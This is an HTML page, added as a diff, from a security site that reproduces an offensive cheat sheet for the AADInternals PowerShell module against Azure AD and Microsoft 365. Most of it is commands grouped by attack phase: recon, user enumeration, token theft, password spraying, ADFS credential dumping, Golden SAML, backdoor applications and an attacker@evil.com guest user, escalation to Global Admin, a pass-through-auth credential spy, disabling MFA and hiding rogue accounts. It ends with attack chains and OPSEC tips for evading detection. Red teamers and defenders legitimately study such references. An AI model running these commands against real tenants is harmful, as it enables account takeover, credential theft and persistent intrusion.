@@ -1,0 +1,382 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AADInternals - Breachcraft Dev</title>
+<meta name="description" content="AADInternals is PowerShell module for administering Azure AD and Office 365">
+<link rel="canonical" href="https://breachcraft.dev/tools/aadinternals/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">AADInternals</p>
+  <h1>AADInternals</h1>
+  <p class="lede">AADInternals is PowerShell module for administering Azure AD and Office 365</p>
+  <h2>What it is</h2>
+<p>For details, please visit <a href="https://aadinternals.com/aadinternals">https://aadinternals.com/aadinternals</a></p>
+<h3>Installation</h3>
+<p>Run the following PowerShell command to install</p>
+<pre><code>Install-Module AADInternals</code></pre>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> PowerShell Module</li><li><strong>Purpose</strong> Azure AD/Entra ID administration, exploitation, and post-exploitation</li><li><strong>Platform</strong> Windows, PowerShell Core (Linux/macOS)</li><li><strong>Tags</strong> #azure #azuread #entraid #powershell #enumeration #credentials #persistence #post-exploitation #token-manipulation</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Install from PowerShell Gallery
+Install-Module AADInternals
+
+# Import module
+Import-Module AADInternals
+
+# Update to latest version
+Update-Module AADInternals</code></pre>
+<h3>Quick Reference (Most Common Commands)</h3>
+<pre><code># Get access token
+Get-AADIntAccessTokenForAADGraph
+
+# Enumerate tenant info
+Get-AADIntTenantDetails -Domain company.com
+
+# Dump users
+Get-AADIntUsers
+
+# Get user's cloud info
+Get-AADIntUserDetails -UserPrincipalName user@domain.com
+
+# Create backdoor admin
+New-AADIntGuestUser -EmailAddress attacker@evil.com</code></pre>
+<h3>RECON: Tenant Discovery</h3>
+<h4>RECON: Get Tenant Information</h4>
+<p><strong>Use Case:</strong> Discover tenant details from domain name</p>
+<pre><code># Get tenant details
+Get-AADIntTenantDetails -Domain company.com
+
+# Get tenant ID
+Get-AADIntTenantID -Domain company.com
+
+# Get tenant domains
+Get-AADIntTenantDomains -Domain company.com</code></pre>
+<h4>RECON: Check Login Information</h4>
+<p><strong>Use Case:</strong> Enumerate authentication details for a domain</p>
+<pre><code># Get login information for domain
+Get-AADIntLoginInformation -Domain company.com
+
+# Check if user exists
+Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com</code></pre>
+<h4>RECON: Enumerate Open ID Configuration</h4>
+<p><strong>Use Case:</strong> Discover tenant federation settings</p>
+<pre><code># Get OpenID configuration
+Get-AADIntOpenIDConfiguration -Domain company.com
+
+# Get tenant brand information
+Get-AADIntTenantBranding -Domain company.com</code></pre>
+<h3>ENUM: User &amp; Group Enumeration</h3>
+<h4>ENUM: List All Users</h4>
+<p><strong>Use Case:</strong> Dump all Azure AD users from authenticated session</p>
+<pre><code># Get all users
+Get-AADIntUsers
+
+# Get specific user details
+Get-AADIntUser -UserPrincipalName user@company.com
+
+# Get user's group memberships
+Get-AADIntUserGroups -UserPrincipalName user@company.com</code></pre>
+<h4>ENUM: List Groups</h4>
+<p><strong>Use Case:</strong> Enumerate Azure AD groups</p>
+<pre><code># Get all groups
+Get-AADIntGroups
+
+# Get group members
+Get-AADIntGroupMembers -GroupId &lt;group-object-id&gt;</code></pre>
+<h4>ENUM: List Service Principals</h4>
+<p><strong>Use Case:</strong> Enumerate applications and service principals</p>
+<pre><code># Get all service principals
+Get-AADIntServicePrincipals
+
+# Get specific service principal
+Get-AADIntServicePrincipal -ObjectId &lt;object-id&gt;</code></pre>
+<h4>ENUM: List Devices</h4>
+<p><strong>Use Case:</strong> Enumerate registered/joined devices</p>
+<pre><code># Get all devices
+Get-AADIntDevices
+
+# Get specific device
+Get-AADIntDevice -DeviceId &lt;device-id&gt;</code></pre>
+<h3>CRED: Authentication &amp; Token Operations</h3>
+<h4>CRED: Get Access Tokens</h4>
+<p><strong>Use Case:</strong> Obtain access tokens for various Azure services</p>
+<pre><code># AAD Graph token
+Get-AADIntAccessTokenForAADGraph
+
+# MS Graph token
+Get-AADIntAccessTokenForMSGraph
+
+# Azure Core Management
+Get-AADIntAccessTokenForAzureCoreManagement
+
+# Exchange Online
+Get-AADIntAccessTokenForEXO
+
+# Teams
+Get-AADIntAccessTokenForTeams
+
+# SharePoint Online
+Get-AADIntAccessTokenForSPO -Domain company.sharepoint.com
+
+# OneDrive
+Get-AADIntAccessTokenForOneDrive</code></pre>
+<h4>CRED: Certificate-Based Authentication</h4>
+<p><strong>Use Case:</strong> Authenticate using certificates</p>
+<pre><code># Get token using certificate
+Get-AADIntAccessTokenForAADGraph -Certificate $cert -ClientId &lt;client-id&gt; -Tenant &lt;tenant-id&gt;
+
+# Export existing certificate from Azure AD
+Export-AADIntADFSSigningCertificate</code></pre>
+<h4>CRED: Managed Identity Token Theft</h4>
+<p><strong>Use Case:</strong> Steal tokens from Azure VM managed identities</p>
+<pre><code># Get token from managed identity
+Get-AADIntAccessTokenForAADGraph -Managed
+
+# Get token with user-assigned identity
+Get-AADIntAccessTokenForAADGraph -Managed -ClientId &lt;client-id&gt;</code></pre>
+<h3>CRED: Password Attacks</h3>
+<h4>CRED: Password Spray</h4>
+<p><strong>Use Case:</strong> Password spray attack against Azure AD</p>
+<pre><code># Invoke password spray
+Invoke-AADIntPasswordSprayAttack -UserName users.txt -Password "Summer2024!"
+
+# Single user password spray
+Invoke-AADIntPasswordSprayAttack -UserName user@company.com -Password "Password123"</code></pre>
+<h4>CRED: Dump Passwords from ADFS</h4>
+<p><strong>Use Case:</strong> Extract credentials from compromised ADFS server</p>
+<pre><code># Export ADFS configuration (includes encrypted passwords)
+Export-AADIntADFSConfiguration
+
+# Get ADFS DKM key
+Get-AADIntADFSConfigurationKeyContainer
+
+# Decrypt ADFS passwords
+Get-AADIntADFSServiceAccount</code></pre>
+<h3>PERSIST: Persistence Mechanisms</h3>
+<h4>PERSIST: Create Backdoor Application</h4>
+<p><strong>Use Case:</strong> Register malicious application for persistence</p>
+<pre><code># Create new application
+New-AADIntApplication -DisplayName "Legitimate App"
+
+# Add credentials to application
+Add-AADIntApplicationCredentials -ObjectId &lt;app-object-id&gt;
+
+# Grant admin consent
+Grant-AADIntAdminConsent -ObjectId &lt;app-object-id&gt;</code></pre>
+<h4>PERSIST: Golden SAML Attack</h4>
+<p><strong>Use Case:</strong> Generate SAML tokens for any user (requires ADFS compromise)</p>
+<pre><code># Export ADFS signing certificate
+Export-AADIntADFSSigningCertificate
+
+# Create SAML token
+New-AADIntSAMLToken -ImmutableID &lt;user-immutable-id&gt; -Issuer &lt;issuer-uri&gt; -Certificate $cert</code></pre>
+<h4>PERSIST: Create Guest User</h4>
+<p><strong>Use Case:</strong> Add external attacker as guest user</p>
+<pre><code># Invite guest user
+New-AADIntGuestUser -EmailAddress attacker@evil.com
+
+# Add guest to group
+Add-AADIntGroupMember -GroupId &lt;group-id&gt; -MemberId &lt;guest-user-id&gt;</code></pre>
+<h4>PERSIST: Modify Federation Settings</h4>
+<p><strong>Use Case:</strong> Backdoor domain federation (requires Global Admin)</p>
+<pre><code># Convert domain to federated
+ConvertTo-AADIntFederated -Domain company.com
+
+# Get federation settings
+Get-AADIntFederationSettings -Domain company.com</code></pre>
+<h3>PRIVESC: Privilege Escalation</h3>
+<h4>PRIVESC: Add User to Admin Role</h4>
+<p><strong>Use Case:</strong> Elevate user privileges</p>
+<pre><code># Add user to Global Admin role
+Add-AADIntRoleMember -RoleName "Company Administrator" -MemberId &lt;user-object-id&gt;
+
+# List available roles
+Get-AADIntRoles
+
+# Get role members
+Get-AADIntRoleMembers -RoleName "Company Administrator"</code></pre>
+<h4>PRIVESC: Reset User Password</h4>
+<p><strong>Use Case:</strong> Reset password of privileged user</p>
+<pre><code># Reset password (requires Password Admin or higher)
+Set-AADIntUserPassword -UserPrincipalName target@company.com -Password "NewPassword123!"
+
+# Force password change on next login
+Set-AADIntUserPassword -UserPrincipalName target@company.com -Password "NewPassword123!" -ForceChangePasswordNextSignIn $true</code></pre>
+<h3>EXEC: Azure AD Modification</h3>
+<h4>EXEC: Create New User</h4>
+<p><strong>Use Case:</strong> Create rogue user account</p>
+<pre><code># Create new user
+New-AADIntUser -DisplayName "Service Account" -UserPrincipalName svc@company.com -Password "P@ssw0rd!"
+
+# Create user with specific attributes
+New-AADIntUser -DisplayName "John Doe" -UserPrincipalName john@company.com -Password "P@ss!" -JobTitle "IT Admin"</code></pre>
+<h4>EXEC: Modify User Properties</h4>
+<p><strong>Use Case:</strong> Update user attributes</p>
+<pre><code># Set user properties
+Set-AADIntUser -UserPrincipalName user@company.com -JobTitle "Global Admin" -Department "IT"
+
+# Enable/disable user
+Set-AADIntUser -UserPrincipalName user@company.com -AccountEnabled $true</code></pre>
+<h3>EXEC: Azure AD Connect Exploitation</h3>
+<h4>EXEC: Export AD Connect Credentials</h4>
+<p><strong>Use Case:</strong> Extract credentials from Azure AD Connect server</p>
+<pre><code># Get AD Connect credentials (run on AD Connect server)
+Get-AADIntSyncCredentials
+
+# Export configuration
+Export-AADIntADSyncConfiguration</code></pre>
+<h4>EXEC: Hybrid Identity Attacks</h4>
+<p><strong>Use Case:</strong> Pass-through auth and password hash sync attacks</p>
+<pre><code># Install PTA agent backdoor
+Install-AADIntPTASpy
+
+# Get PTA credentials
+Get-AADIntPTASpyLog
+
+# Set cloud password (requires MSOL_ account from AD Connect)
+Set-AADIntUserPassword -CloudAnchor "user_1234..." -Password "NewP@ss!"</code></pre>
+<h3>LATERAL: Microsoft 365 Service Access</h3>
+<h4>LATERAL: Exchange Online</h4>
+<p><strong>Use Case:</strong> Access Exchange mailboxes</p>
+<pre><code># Get EXO access token
+$token = Get-AADIntAccessTokenForEXO
+
+# Read emails (requires additional Graph/EWS calls)</code></pre>
+<h4>LATERAL: SharePoint/OneDrive</h4>
+<p><strong>Use Case:</strong> Access SharePoint sites and OneDrive</p>
+<pre><code># Get SPO token
+$token = Get-AADIntAccessTokenForSPO -Domain company.sharepoint.com
+
+# List user's OneDrive files
+Get-AADIntOneDriveFiles -AccessToken $token</code></pre>
+<h4>LATERAL: Teams Access</h4>
+<p><strong>Use Case:</strong> Access Teams data</p>
+<pre><code># Get Teams token
+$token = Get-AADIntAccessTokenForTeams
+
+# Access Teams messages (requires Graph API calls)</code></pre>
+<h3>DEFENSE-EVASION: Stealth Operations</h3>
+<h4>DEFENSE-EVASION: Disable MFA for User</h4>
+<p><strong>Use Case:</strong> Remove MFA requirement (highly suspicious)</p>
+<pre><code># Disable MFA (requires StrongAuthentication admin)
+Set-AADIntUser -UserPrincipalName user@company.com -StrongAuthenticationRequirements @()</code></pre>
+<h4>DEFENSE-EVASION: Hide User from GAL</h4>
+<p><strong>Use Case:</strong> Hide rogue account from Global Address List</p>
+<pre><code># Hide user from GAL
+Set-AADIntUser -UserPrincipalName backdoor@company.com -ShowInAddressList $false</code></pre>
+<h3>Attack Patterns</h3>
+<h4>Pattern: External Recon → Password Spray → Token Theft</h4>
+<pre><code># 1. Recon tenant
+Get-AADIntTenantDetails -Domain company.com
+Get-AADIntLoginInformation -Domain company.com
+
+# 2. Enumerate users (if possible)
+Invoke-AADIntUserEnumerationAsOutsider -UserName users.txt
+
+# 3. Password spray
+Invoke-AADIntPasswordSprayAttack -UserName valid-users.txt -Password "SeasonYear!"
+
+# 4. Get tokens after successful auth
+Get-AADIntAccessTokenForAADGraph
+Get-AADIntAccessTokenForMSGraph</code></pre>
+<h4>Pattern: Compromised User → Privilege Escalation</h4>
+<pre><code># 1. Get initial access token
+Get-AADIntAccessTokenForAADGraph
+
+# 2. Enumerate environment
+Get-AADIntUsers
+Get-AADIntGroups
+Get-AADIntServicePrincipals
+
+# 3. Check current permissions
+Get-AADIntRoleMembers -RoleName "Company Administrator"
+
+# 4. Escalate if possible
+Add-AADIntRoleMember -RoleName "Company Administrator" -MemberId &lt;your-user-id&gt;</code></pre>
+<h4>Pattern: AD Connect Server Compromise → Full Tenant Takeover</h4>
+<pre><code># 1. Extract AD Connect credentials (on AD Connect server)
+Get-AADIntSyncCredentials
+
+# 2. Use MSOL account to reset any cloud password
+Set-AADIntUserPassword -CloudAnchor "&lt;target-cloud-anchor&gt;" -Password "Pwned123!"
+
+# 3. Login as Global Admin
+Get-AADIntAccessTokenForAADGraph
+
+# 4. Maintain persistence
+New-AADIntApplication -DisplayName "Monitoring Service"
+Add-AADIntApplicationCredentials -ObjectId &lt;app-id&gt;
+Grant-AADIntAdminConsent -ObjectId &lt;app-id&gt;</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Token Caching</strong>: AADInternals caches tokens. Use <code>-UseRefreshToken</code> to get fresh tokens 💡 <strong>Certificate Auth</strong>: More stealthy than password auth, especially for service principals 💡 <strong>AD Connect</strong>: The MSOL_ account can reset ANY cloud user password - highest value target 💡 <strong>Golden SAML</strong>: Works even if passwords are changed, requires ADFS signing cert 💡 <strong>Managed Identities</strong>: On Azure VMs, you can get tokens without any credentials 💡 <strong>Federation Backdoor</strong>: Setting up federated domain is extremely powerful but very noisy 💡 <strong>Guest Users</strong>: Often overlooked in detection, can grant access to external attackers 💡 <strong>PTA Spy</strong>: Can harvest credentials for ALL authenticating users on hybrid tenants</p>
+<h3>Key Functions by Category</h3>
+<p><strong>Reconnaissance:</strong></p>
+<ul>
+<li><code>Get-AADIntTenantDetails</code>, <code>Get-AADIntLoginInformation</code>, <code>Invoke-AADIntUserEnumerationAsOutsider</code></li>
+</ul>
+<p><strong>Enumeration:</strong></p>
+<ul>
+<li><code>Get-AADIntUsers</code>, <code>Get-AADIntGroups</code>, <code>Get-AADIntServicePrincipals</code>, <code>Get-AADIntDevices</code></li>
+</ul>
+<p><strong>Tokens:</strong></p>
+<ul>
+<li><code>Get-AADIntAccessTokenFor*</code> (AADGraph, MSGraph, EXO, Teams, SPO, etc.)</li>
+</ul>
+<p><strong>Credential Attacks:</strong></p>
+<ul>
+<li><code>Invoke-AADIntPasswordSprayAttack</code>, <code>Get-AADIntADFSServiceAccount</code></li>
+</ul>
+<p><strong>Persistence:</strong></p>
+<ul>
+<li><code>New-AADIntApplication</code>, <code>New-AADIntGuestUser</code>, <code>ConvertTo-AADIntFederated</code>, <code>New-AADIntSAMLToken</code></li>
+</ul>
+<p><strong>Privilege Escalation:</strong></p>
+<ul>
+<li><code>Add-AADIntRoleMember</code>, <code>Set-AADIntUserPassword</code>, <code>Get-AADIntSyncCredentials</code></li>
+</ul>
+<p><strong>Hybrid Identity:</strong></p>
+<ul>
+<li><code>Get-AADIntSyncCredentials</code>, <code>Install-AADIntPTASpy</code>, <code>Export-AADIntADFSConfiguration</code></li>
+</ul>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>ConvertTo-AADIntFederated (extremely noisy)</li>
+<li>Add-AADIntRoleMember to Global Admin</li>
+<li>Install-AADIntPTASpy (requires admin on PTA server)</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>New-AADIntApplication with admin consent</li>
+<li>Set-AADIntUserPassword (generates password reset logs)</li>
+<li>Invoke-AADIntPasswordSprayAttack (account lockouts)</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>Get-AADInt* enumeration commands</li>
+<li>Token operations using valid credentials</li>
+<li>Certificate-based authentication</li>
+</ul>
+<h3>Resources</h3>
+<ul>
+<li>Documentation: <a href="https://aadinternals.com/aadinternals">https://aadinternals.com/aadinternals</a></li>
+<li>GitHub: <a href="https://github.com/Gerenios/AADInternals">https://github.com/Gerenios/AADInternals</a></li>
+<li>O365 Blog: <a href="https://o365blog.com/aadinternals">https://o365blog.com/aadinternals</a></li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
